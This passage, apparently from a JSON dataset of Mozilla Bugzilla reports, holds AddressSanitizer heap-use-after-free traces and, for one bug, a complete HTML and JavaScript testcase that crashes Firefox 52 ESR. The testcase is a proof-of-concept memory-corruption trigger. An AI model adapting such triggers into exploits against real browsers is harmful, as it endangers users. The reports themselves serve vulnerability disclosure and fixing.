0x7f067c6deaba in mozilla::EventDispatcher::DispatchDOMEvent(nsISupports*, mozilla::WidgetEvent*, nsIDOMEvent*, nsPresContext*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:891:12 #36 0x7f067a8c20b1 in nsINode::DispatchEvent(nsIDOMEvent*, bool*) /builds/worker/workspace/build/src/dom/base/nsINode.cpp:1337:5 previously allocated by thread T0 (file:// Content) here: #0 0x4bc44c in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:64:3 #1 0x4ed85d in moz_xmalloc /builds/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:84:17 #2 0x7f067a7bf033 in operator new /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:206:12 #3 0x7f067a7bf033 in nsDocument::CreateShell(nsPresContext*, nsViewManager*, mozilla::StyleSetHandle) /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:4137 #4 0x7f067e9c9e1f in nsDocumentViewer::InitPresentationStuff(bool) /builds/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:684:27 #5 0x7f067e9c96ef in nsDocumentViewer::InitInternal(nsIWidget*, nsISupports*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, bool, bool, bool) /builds/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:942:10 #6 0x7f067e9c8957 in nsDocumentViewer::Init(nsIWidget*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /builds/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:659:10 #7 0x7f06819e459b in nsDocShell::SetupNewViewer(nsIContentViewer*) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:9552:7 #8 0x7f06819e2f5c in nsDocShell::Embed(nsIContentViewer*, char const*, nsISupports*) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7376:17 #9 0x7f06819f19d8 in nsDocShell::CreateAboutBlankContentViewer(nsIPrincipal*, nsIURI*, bool, bool) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:8250:14 #10 0x7f067a477cd5 in nsGlobalWindow::SetInitialPrincipalToSubject() /builds/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:2605:18 #11 0x7f06826045b6 in nsWindowWatcher::OpenWindowInternal(mozIDOMWindowProxy*, char const*, char const*, char const*, bool, bool, bool, nsIArray*, bool, bool, nsIDocShellLoadInfo*, mozIDOMWindowProxy**) /builds/worker/workspace/build/src/toolkit/components/windowwatcher/nsWindowWatcher.cpp:1117:18 #12 0x7f06826099df in OpenWindow2 /builds/worker/workspace/build/src/toolkit/components/windowwatcher/nsWindowWatcher.cpp:444:10 #13 0x7f06826099df in non-virtual thunk to nsWindowWatcher::OpenWindow2(mozIDOMWindowProxy*, char const*, char const*, char const*, bool, bool, bool, nsISupports*, bool, bool, nsIDocShellLoadInfo*, mozIDOMWindowProxy**) /builds/worker/workspace/build/src/toolkit/components/windowwatcher/nsWindowWatcher.cpp:416 #14 0x7f067a4c7145 in nsGlobalWindow::OpenInternal(nsTSubstring<char16_t> const&, nsTSubstring<char16_t> const&, nsTSubstring<char16_t> const&, bool, bool, bool, bool, bool, nsIArray*, nsISupports*, nsIDocShellLoadInfo*, bool, nsPIDOMWindowOuter**) /builds/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:12911:21 #15 0x7f067a4c571f in OpenJS /builds/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:8966:10 #16 0x7f067a4c571f in nsGlobalWindow::OpenOuter(nsTSubstring<char16_t> const&, nsTSubstring<char16_t> const&, nsTSubstring<char16_t> const&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:8928 #17 0x7f067a4c5bad in nsGlobalWindow::Open(nsTSubstring<char16_t> const&, nsTSubstring<char16_t> const&, nsTSubstring<char16_t> const&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:8937:3 #18 0x7f067babfc23 in mozilla::dom::WindowBinding::open(JSContext*, JS::Handle<JSObject*>, nsGlobalWindow*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/WindowBinding.cpp:2192:56 #19 0x7f067babdf85 in mozilla::dom::WindowBinding::genericMethod(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/WindowBinding.cpp:15335:13 #20 0x7f06829577f0 in CallJSNative /builds/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #21 0x7f06829577f0 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:473 #22 0x7f0682942447 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:528:12 #23 0x7f0682942447 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3067 #24 0x7f068292a14a in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:423:12 #25 0x7f06829578ef in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:495:15 #26 0x7f06829587e2 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:541:10 #27 0x7f068339d16b in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:3020:12 #28 0x7f067bd697e5 in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:260:37 #29 0x7f067c761e1d in Call<nsISupports *> /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:362:12 #30 0x7f067c761e1d in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /builds/worker/workspace/build/src/dom/events/JSEventHandler.cpp:215 #31 0x7f067c72ab46 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1118:51 #32 0x7f067c72cd12 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1293:20 #33 0x7f067c70c3f1 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:462:16 #34 0x7f067c70f8c2 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:822:9 #35 0x7f067e9cf5ce in nsDocumentViewer::LoadComplete(nsresult) /builds/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1064:7 SUMMARY: AddressSanitizer: heap-use-after-free /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:287:27 in get Shadow bytes around the buggy address: 0x0c447ffffdd0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c447ffffde0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c447ffffdf0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c447ffffe00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c447ffffe10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa =>0x0c447ffffe20: fd fd[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c447ffffe30: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c447ffffe40: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c447ffffe50: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c447ffffe60: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c447ffffe70: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==10774==ABORTING"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1406750",
        "title": "heap-use-after-free in GetContentRectRelativeToSelf",
        "description": "The following testcase crashes the latest ASAN build of Firefox 52 ESR. scripts.html needs to be in the same directory. crash.html: <script> function spin () { var x=new XMLHttpRequest(); x.open(\"POST\",\"https://mozilla.org\",false); try{x.send(\"X\");}catch(e){} } function start() { o147=document.documentElement; o200=o147.querySelector('*:not([id])'); o243=document.createElementNS('http://www.w3.org/1999/xhtml','iframe'); o243.src='scripts.html'; document.documentElement.appendChild(o243); } function fun0(doc) { o519=doc; o527=o519.querySelector('*:not([id])'); o593=document.createElementNS('http://www.w3.org/1999/xhtml','iframe'); o200.appendChild(o593); } function fun1() { spin(); } function fun2() { o200.setAttribute('style','all: unset'); o697=o593.contentWindow; o698=o697.document; document.documentElement.appendChild(o698.replaceChild(o519.documentElement,o698.documentElement)); o593.contentWindow.onresize=fun3; } function fun3() { document.documentElement.appendChild(o200); window.top.document.documentElement.appendChild(o527); } </script> <body onload=\"start()\"></body> scripts.html: <marquee id='id8' > <script> window.top.fun0(document); </script> <style> ::first-line { </style> <script> window.top.fun1(); </script> <script> window.top.fun2(); </script> ASAN output: ================================================================= ==9825==ERROR: AddressSanitizer: heap-use-after-free on address 0x625000a46120 at pc 0x7f818075fda1 bp 0x7ffccb993750 sp 0x7ffccb993748 READ of size 8 at 0x625000a46120 thread T0 #0 0x7f818075fda0 in GetUsedBorderAndPadding /home/worker/workspace/build/src/layout/generic/nsIFrame.h:1125:12 #1 0x7f818075fda0 in GetContentRectRelativeToSelf /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:1233 #2 0x7f818075fda0 in nsIFrame::GetContentRect() const /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:1243 #3 0x7f81801a30fb in nsComputedDOMStyle::DoGetWidth() /home/worker/workspace/build/src/layout/style/nsComputedDOMStyle.cpp:4844:22 #4 0x7f8180168225 in nsComputedDOMStyle::GetPropertyCSSValue(nsAString_internal const&, mozilla::ErrorResult&) /home/worker/workspace/build/src/layout/style/nsComputedDOMStyle.cpp:807:11 #5 0x7f8180166386 in nsComputedDOMStyle::GetPropertyValue(nsAString_internal const&, nsAString_internal&) /home/worker/workspace/build/src/layout/style/nsComputedDOMStyle.cpp:379:26 #6 0x7f81801661a8 in nsComputedDOMStyle::GetPropertyValue(nsCSSPropertyID, nsAString_internal&) /home/worker/workspace/build/src/layout/style/nsComputedDOMStyle.cpp:317:10 #7 0x7f817ca51ee9 in GetWidth /home/worker/workspace/build/src/layout/style/nsCSSPropList.h:4392:1 #8 0x7f817ca51ee9 in mozilla::dom::CSS2PropertiesBinding::get_width(JSContext*, JS::Handle<JSObject*>, nsDOMCSSDeclaration*, JSJitGetterCallArgs) /home/worker/workspace/build/src/obj-firefox/dom/bindings/CSS2PropertiesBinding.cpp:42528 #9 0x7f817e017f80 in mozilla::dom::GenericBindingGetter(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2824:13 #10 0x7f81843a2de5 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #11 0x7f81843a2de5 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #12 0x7f81843a3a92 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #13 0x7f8183e748ed in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2828:12 #14 0x7f817af79022 in Call /home/worker/workspace/build/src/obj-firefox/dist/include/jsapi.h:3330:12 #15 0x7f817af79022 in xpc::XrayWrapper<js::CrossCompartmentWrapper, xpc::DOMXrayTraits>::get(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) const /home/worker/workspace/build/src/js/xpconnect/wrappers/XrayWrapper.cpp:2247 #16 0x7f81840eceee in js::Proxy::get(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:309:12 #17 0x7f81840ed28c in GetProperty /home/worker/workspace/build/src/js/src/vm/NativeObject.h:1522:16 #18 0x7f81840ed28c in js::Proxy::get(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:305 #19 0x7f81843af0e1 in GetProperty /home/worker/workspace/build/src/js/src/vm/NativeObject.h:1522:16 #20 0x7f81843af0e1 in GetProperty /home/worker/workspace/build/src/js/src/jsobj.h:846 #21 0x7f81843af0e1 in js::GetProperty(JSContext*, JS::Handle<JS::Value>, JS::Handle<js::PropertyName*>, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:4263 #22 0x7f818438769c in GetPropertyOperation /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:192:12 #23 0x7f818438769c in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2639 #24 0x7f81843683ad in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 #25 0x7f81843a344f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:477:15 #26 0x7f81843a3a92 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #27 0x7f8183e72682 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2769:12 #28 0x7f817f8949bb in Call /home/worker/workspace/build/src/obj-firefox/dist/include/jsapi.h:3310:14 #29 0x7f817f8949bb in nsXBLProtoImplAnonymousMethod::Execute(nsIContent*, JSAddonId*) /home/worker/workspace/build/src/dom/xbl/nsXBLProtoImplMethod.cpp:331 #30 0x7f817f85e56e in nsXBLBinding::ExecuteAttachedHandler() /home/worker/workspace/build/src/dom/xbl/nsXBLBinding.cpp:634:5 #31 0x7f817f85e36e in nsBindingManager::ProcessAttachedQueueInternal(unsigned int) /home/worker/workspace/build/src/dom/xbl/nsBindingManager.cpp:419:7 #32 0x7f81806e1003 in ProcessAttachedQueue /home/worker/workspace/build/src/dom/xbl/nsBindingManager.h:105:5 #33 0x7f81806e1003 in XBLConstructorRunner::Run() /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:1687 #34 0x7f817c0e24ae in nsContentUtils::RemoveScriptBlocker() /home/worker/workspace/build/src/dom/base/nsContentUtils.cpp:5195:5 #35 0x7f81805eb64a in ~nsAutoScriptBlocker /home/worker/workspace/build/src/obj-firefox/dist/include/nsContentUtils.h:2865:5 #36 0x7f81805eb64a in nsDocumentViewer::Show() /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:2158 #37 0x7f8181375989 in SetVisibility /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:6486:5 #38 0x7f8181375989 in non-virtual thunk to nsDocShell::SetVisibility(bool) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:6476 #39 0x7f817c57bf0a in nsFrameLoader::Show(int, int, int, int, nsSubDocumentFrame*) /home/worker/workspace/build/src/dom/base/nsFrameLoader.cpp:864:3 #40 0x7f8180983205 in nsSubDocumentFrame::ShowViewer() /home/worker/workspace/build/src/layout/generic/nsSubDocumentFrame.cpp:188:9 #41 0x7f8180a01682 in AsyncFrameInit::Run() /home/worker/workspace/build/src/layout/generic/nsSubDocumentFrame.cpp:90:7 #42 0x7f817c0e24ae in nsContentUtils::RemoveScriptBlocker() /home/worker/workspace/build/src/dom/base/nsContentUtils.cpp:5195:5 #43 0x7f818068a3d3 in ~nsAutoScriptBlocker /home/worker/workspace/build/src/obj-firefox/dist/include/nsContentUtils.h:2865:5 #44 0x7f818068a3d3 in PresShell::FlushPendingNotifications(mozilla::ChangesToFlush) /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:4168 #45 0x7f818039c02c in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1836:11 #46 0x7f81803a430a in DoTick /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1483:5 #47 0x7f81803a430a in DoRefresh /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:2257 #48 0x7f81803a430a in nsRefreshDriver::WillRefresh(mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:2175 #49 0x7f818039ad66 in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1798:7 #50 0x7f81803a3a52 in DoTick /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1483:5 #51 0x7f81803a3a52 in DoRefresh /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:2257 #52 0x7f81803a3a52 in nsRefreshDriver::FinishedWaitingForTransaction() /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:2108 #53 0x7f817bb012a7 in mozilla::layers::ClientLayerManager::DidComposite(unsigned long, mozilla::TimeStamp const&, mozilla::TimeStamp const&) /home/worker/workspace/build/src/gfx/layers/client/ClientLayerManager.cpp:463:5 #54 0x7f817bbf879c in mozilla::layers::CompositorBridgeChild::RecvDidComposite(unsigned long const&, unsigned long const&, mozilla::TimeStamp const&, mozilla::TimeStamp const&) /home/worker/workspace/build/src/gfx/layers/ipc/CompositorBridgeChild.cpp:550:5 #55 0x7f817ad2849d in mozilla::layers::PCompositorBridgeChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PCompositorBridgeChild.cpp:1390:20 #56 0x7f817a6bd455 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1743:14 #57 0x7f817a6b9c9c in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1681:17 #58 0x7f817a6bbd74 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1572:5 #59 0x7f817a6bc42e in mozilla::ipc::MessageChannel::MessageTask::Run() /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1597:5 #60 0x7f817988a7bb in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1216:7 #61 0x7f817990c8fc in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/glue/nsThreadUtils.cpp:361:10 #62 0x7f817a6c557f in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #63 0x7f817a6370d8 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:232:3 #64 0x7f817a6370d8 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:225 #65 0x7f817a6370d8 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:205 #66 0x7f817fccffff in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:3 #67 0x7f8181d4dd31 in nsAppStartup::Run() /home/worker/workspace/build/src/toolkit/components/startup/nsAppStartup.cpp:283:19 #68 0x7f8181ee5047 in XREMain::XRE_mainRun() /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4488:10 #69 0x7f8181ee67bd in XREMain::XRE_main(int, char**, nsXREAppData const*) /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4621:8 #70 0x7f8181ee767c in XRE_main /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4712:16 #71 0x4df91a in do_main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:282:10 #72 0x4df91a in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:415 #73 0x7f81952d682f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) #74 0x41ba88 in _start (/fuzzer3/esr/firefox/firefox+0x41ba88) 0x625000a46120 is located 32 bytes inside of 8192-byte region [0x625000a46100,0x625000a48100) freed by thread T0 here: #0 0x4b21db in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:38:3 #1 0x7f81928b4117 in FreeArenaList /home/worker/workspace/build/src/nsprpub/lib/ds/plarena.c:195:9 #2 0x7f81928b4117 in PL_FinishArenaPool /home/worker/workspace/build/src/nsprpub/lib/ds/plarena.c:222 #3 0x7f81803927ff in nsPresArena::~nsPresArena() /home/worker/workspace/build/src/layout/base/nsPresArena.cpp:56:3 #4 0x7f818066aa70 in nsIPresShell::~nsIPresShell() /home/worker/workspace/build/src/layout/base/nsIPresShell.h:181:7 #5 0x7f818066abbd in PresShell::~PresShell() /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:841:1 #6 0x7f8180667453 in PresShell::Release() /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:835:1 #7 0x7f818016868f in ~nsCOMPtr_base /home/worker/workspace/build/src/obj-firefox/dist/include/nsCOMPtr.h:294:7 #8 0x7f818016868f in nsComputedDOMStyle::GetStyleContextForElement(mozilla::dom::Element*, nsIAtom*, nsIPresShell*, nsComputedDOMStyle::StyleType) /home/worker/workspace/build/src/layout/style/nsComputedDOMStyle.cpp:426 #9 0x7f81801676d1 in nsComputedDOMStyle::UpdateCurrentStyleSources(bool) /home/worker/workspace/build/src/layout/style/nsComputedDOMStyle.cpp:705:7 #10 0x7f81801680eb in nsComputedDOMStyle::GetPropertyCSSValue(nsAString_internal const&, mozilla::ErrorResult&) /home/worker/workspace/build/src/layout/style/nsComputedDOMStyle.cpp:796:3 #11 0x7f8180166386 in nsComputedDOMStyle::GetPropertyValue(nsAString_internal const&, nsAString_internal&) /home/worker/workspace/build/src/layout/style/nsComputedDOMStyle.cpp:379:26 #12 0x7f81801661a8 in nsComputedDOMStyle::GetPropertyValue(nsCSSPropertyID, nsAString_internal&) /home/worker/workspace/build/src/layout/style/nsComputedDOMStyle.cpp:317:10 #13 0x7f817ca51ee9 in GetWidth /home/worker/workspace/build/src/layout/style/nsCSSPropList.h:4392:1 #14 0x7f817ca51ee9 in mozilla::dom::CSS2PropertiesBinding::get_width(JSContext*, JS::Handle<JSObject*>, nsDOMCSSDeclaration*, JSJitGetterCallArgs) /home/worker/workspace/build/src/obj-firefox/dom/bindings/CSS2PropertiesBinding.cpp:42528 #15 0x7f817e017f80 in mozilla::dom::GenericBindingGetter(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2824:13 #16 0x7f81843a2de5 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #17 0x7f81843a2de5 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #18 0x7f81843a3a92 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #19 0x7f8183e748ed in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2828:12 #20 0x7f817af79022 in Call /home/worker/workspace/build/src/obj-firefox/dist/include/jsapi.h:3330:12 #21 0x7f817af79022 in xpc::XrayWrapper<js::CrossCompartmentWrapper, xpc::DOMXrayTraits>::get(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) const /home/worker/workspace/build/src/js/xpconnect/wrappers/XrayWrapper.cpp:2247 #22 0x7f81840eceee in js::Proxy::get(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:309:12 #23 0x7f81840ed28c in GetProperty /home/worker/workspace/build/src/js/src/vm/NativeObject.h:1522:16 #24 0x7f81840ed28c in js::Proxy::get(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:305 #25 0x7f81843af0e1 in GetProperty /home/worker/workspace/build/src/js/src/vm/NativeObject.h:1522:16 #26 0x7f81843af0e1 in GetProperty /home/worker/workspace/build/src/js/src/jsobj.h:846 #27 0x7f81843af0e1 in js::GetProperty(JSContext*, JS::Handle<JS::Value>, JS::Handle<js::PropertyName*>, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:4263 #28 0x7f818438769c in GetPropertyOperation /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:192:12 #29 0x7f818438769c in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2639 #30 0x7f81843683ad in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 #31 0x7f81843a344f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:477:15 #32 0x7f81843a3a92 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #33 0x7f8183e72682 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2769:12 #34 0x7f817f8949bb in Call /home/worker/workspace/build/src/obj-firefox/dist/include/jsapi.h:3310:14 #35 0x7f817f8949bb in nsXBLProtoImplAnonymousMethod::Execute(nsIContent*, JSAddonId*) /home/worker/workspace/build/src/dom/xbl/nsXBLProtoImplMethod.cpp:331 #36 0x7f817f85e56e in nsXBLBinding::ExecuteAttachedHandler() /home/worker/workspace/build/src/dom/xbl/nsXBLBinding.cpp:634:5 #37 0x7f817f85e36e in nsBindingManager::ProcessAttachedQueueInternal(unsigned int) /home/worker/workspace/build/src/dom/xbl/nsBindingManager.cpp:419:7 #38 0x7f81806e1003 in ProcessAttachedQueue /home/worker/workspace/build/src/dom/xbl/nsBindingManager.h:105:5 #39 0x7f81806e1003 in XBLConstructorRunner::Run() /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:1687 #40 0x7f817c0e24ae in nsContentUtils::RemoveScriptBlocker() /home/worker/workspace/build/src/dom/base/nsContentUtils.cpp:5195:5 previously allocated by thread T0 here: #0 0x4b24fb in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:52:3 #1 0x7f81928b3a24 in PL_ArenaAllocate /home/worker/workspace/build/src/nsprpub/lib/ds/plarena.c:127:27 #2 0x7f8180393041 in nsPresArena::Allocate(unsigned int, unsigned long) /home/worker/workspace/build/src/layout/base/nsPresArena.cpp:165:3 #3 0x7f818075c6ef in AllocateByFrameID /home/worker/workspace/build/src/layout/base/nsPresArena.h:52:12 #4 0x7f818075c6ef in AllocateFrame /home/worker/workspace/build/src/obj-firefox/dist/include/nsIPresShell.h:229 #5 0x7f818075c6ef in operator new /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:312 #6 